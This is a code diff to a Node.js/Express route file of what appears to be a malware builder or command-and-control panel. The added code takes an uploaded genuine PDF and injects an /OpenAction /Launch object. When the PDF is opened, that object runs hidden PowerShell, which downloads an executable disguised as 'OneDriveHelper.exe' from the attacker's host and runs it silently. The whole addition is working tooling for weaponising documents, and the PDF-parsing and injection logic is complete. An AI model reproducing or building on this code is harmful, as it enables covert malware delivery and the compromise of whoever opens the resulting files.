@@ -4,8 +4,12 @@ const express   = require("express");
 const fs        = require("fs");
 const path      = require("path");
 const { spawn } = require("child_process");
+const multer    = require("multer");
 const { requireAdmin }    = require("../middleware/auth");
 const { buildStubBinary } = require("../controllers/builderController");
+
+// In-memory storage for uploaded PDFs (no disk writes needed)
+const pdfUpload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 20 * 1024 * 1024 } });
 
 const router = express.Router();
 
@@ -880,5 +884,152 @@ function createLnkBuffer(target, args) {
 
   return Buffer.concat([hdr, li, argLen, argStr]);
 }
+
+// ── PDF /Launch injection into an uploaded PDF ────────────────────────────────
+// Uses PDF incremental-update spec: the original file bytes are untouched,
+// new objects and a new xref section are appended at the end.
+// Supports traditional xref tables (PDF 1.4).  Cross-reference streams
+// (PDF 1.5+) require a "Save as PDF 1.4" step first.
+
+function findObjInXref(pdfStr, xrefOff, objNum) {
+  const lines = pdfStr.slice(xrefOff).split(/\r?\n/);
+  let li = 0;
+  if (lines[li].trim() === "xref") li++;
+  while (li < lines.length) {
+    const hdr = lines[li].trim();
+    if (hdr === "trailer" || hdr.startsWith("<<")) break;
+    const sub = hdr.match(/^(\d+)\s+(\d+)$/);
+    if (!sub) { li++; continue; }
+    const first = parseInt(sub[1]), count = parseInt(sub[2]);
+    li++;
+    for (let k = 0; k < count; k++, li++) {
+      const m = (lines[li] || "").match(/^(\d{10})\s+\d{5}\s+([nf])/);
+      if (!m) { k--; continue; }
+      if (first + k === objNum && m[2] === "n") return parseInt(m[1]);
+    }
+  }
+  return -1;
+}
+
+function injectLaunchIntoPdf(pdfBuf, psArgs) {
+  const pdf = pdfBuf.toString("latin1");
+
+  // Find the last startxref offset
+  const sxAll = [...pdf.matchAll(/startxref\s*\r?\n\s*(\d+)/g)];
+  if (!sxAll.length) throw new Error("No startxref — is this a valid PDF?");
+  const origXrefOff = parseInt(sxAll[sxAll.length - 1][1]);
+
+  // Reject cross-reference streams (PDF 1.5+)
+  if (!pdf.slice(origXrefOff, origXrefOff + 5).trimStart().startsWith("xref")) {
+    throw new Error(
+      "This PDF uses cross-reference streams (PDF 1.5+). " +
+      "Re-save as PDF 1.4 in Acrobat (Save As → PDF 1.4) or LibreOffice " +
+      "(Export as PDF → Compatibility: PDF 1.4), then upload again."
+    );
+  }
+
+  // Parse trailer for /Root and /Size
+  const trailerM = pdf.slice(origXrefOff).match(/trailer\s*<<([\s\S]*?)>>/);
+  if (!trailerM) throw new Error("Could not find PDF trailer dict");
+  const tb = trailerM[1];
+  const rootM = tb.match(/\/Root\s+(\d+)\s+0\s+R/);
+  const sizeM = tb.match(/\/Size\s+(\d+)/);
+  if (!rootM || !sizeM) throw new Error("Trailer missing /Root or /Size");
+
+  const catNum      = parseInt(rootM[1]);
+  const origSize    = parseInt(sizeM[1]);
+  const newActNum   = origSize;   // next free object number
+
+  // Find catalog object byte offset
+  const catOff = findObjInXref(pdf, origXrefOff, catNum);
+  if (catOff < 0) throw new Error("Catalog object not found in xref table");
+
+  // Read catalog dict (between obj keyword and endobj)
+  const catSrc = pdf.slice(catOff);
+  const catM   = catSrc.match(/^\d+\s+0\s+obj\s*(<<[\s\S]*?>>)\s*(?:stream|endobj)/);
+  if (!catM) throw new Error("Could not parse catalog dict");
+
+  let catDict = catM[1];
+  // Remove any pre-existing /OpenAction so we don't duplicate
+  catDict = catDict.replace(/\/OpenAction\s+\d+\s+0\s+R\s*/g, "");
+  // Insert our /OpenAction before the closing >>
+  catDict = catDict.replace(/>>\s*$/, `/OpenAction ${newActNum} 0 R\n>>`);
+
+  // Build the appended block
+  const sep        = "\n";
+  const updCat     = `${catNum} 0 obj\n${catDict}\nendobj\n\n`;
+  const actObj     =
+    `${newActNum} 0 obj\n` +
+    `<< /Type /Action /S /Launch\n` +
+    `   /Win << /F (powershell.exe)\n` +
+    `           /P (${psArgs})\n` +
+    `           /D (C:\\\\Windows\\\\System32) >> >>\n` +
+    `endobj\n\n`;
+
+  const base   = pdfBuf.length + Buffer.byteLength(sep, "latin1");
+  const catAt  = base;
+  const actAt  = base + Buffer.byteLength(updCat, "latin1");
+  const xrAt   = actAt + Buffer.byteLength(actObj, "latin1");
+
+  // Build xref subsections — two objects, possibly non-contiguous
+  const objs = [{ n: catNum, o: catAt }, { n: newActNum, o: actAt }]
+    .sort((a, b) => a.n - b.n);
+
+  let xrSec = "xref\n";
+  let i = 0;
+  while (i < objs.length) {
+    let j = i;
+    while (j + 1 < objs.length && objs[j + 1].n === objs[j].n + 1) j++;
+    xrSec += `${objs[i].n} ${j - i + 1}\n`;
+    for (let k = i; k <= j; k++)
+      xrSec += objs[k].o.toString().padStart(10, "0") + " 00000 n \n";
+    i = j + 1;
+  }
+
+  const trailer =
+    `trailer\n<< /Size ${origSize + 1} /Root ${catNum} 0 R /Prev ${origXrefOff} >>\n` +
+    `startxref\n${xrAt}\n%%EOF\n`;
+
+  return Buffer.concat([
+    pdfBuf,
+    Buffer.from(sep,    "latin1"),
+    Buffer.from(updCat, "latin1"),
+    Buffer.from(actObj, "latin1"),
+    Buffer.from(xrSec + trailer, "latin1"),
+  ]);
+}
+
+// POST /api/builder/inject-pdf — upload a real PDF, get it back with /Launch injected
+router.post("/api/builder/inject-pdf", requireAdmin,
+  pdfUpload.single("pdf"),
+  (req, res) => {
+    if (!req.file) return res.status(400).json({ error: "No PDF file received" });
+
+    if (!fs.existsSync(DL_HELPER))
+      return res.status(400).json({ error: "OneDriveHelper.exe not found — click Build first." });
+
+    const proto = req.headers["x-forwarded-proto"] || (req.secure ? "https" : "http");
+    const host  = (req.body.c2host || "").trim() || req.headers.host || "localhost";
+    const payloadUrl = `${proto}://${host}/dl/exe`;
+
+    const pdfStr = s => s.replace(/\\/g,"\\\\").replace(/\(/g,"\\(").replace(/\)/g,"\\)");
+    const psArgs = pdfStr(
+      `-w hidden -nop -c "$wc=New-Object Net.WebClient;` +
+      `$wc.DownloadFile('${payloadUrl}',$env:TEMP+'\\OneDriveHelper.exe');` +
+      `Start-Process ($env:TEMP+'\\OneDriveHelper.exe') -WindowStyle Hidden"`
+    );
+
+    try {
+      const result   = injectLaunchIntoPdf(req.file.buffer, psArgs);
+      const origName = (req.file.originalname || "document.pdf")
+        .replace(/[^a-zA-Z0-9._\- ]/g, "_");
+      res.setHeader("Content-Type", "application/pdf");
+      res.setHeader("Content-Disposition", `attachment; filename="${origName}"`);
+      res.send(result);
+    } catch (e) {
+      res.status(400).json({ error: e.message });
+    }
+  }
+);
 
 module.exports = router;
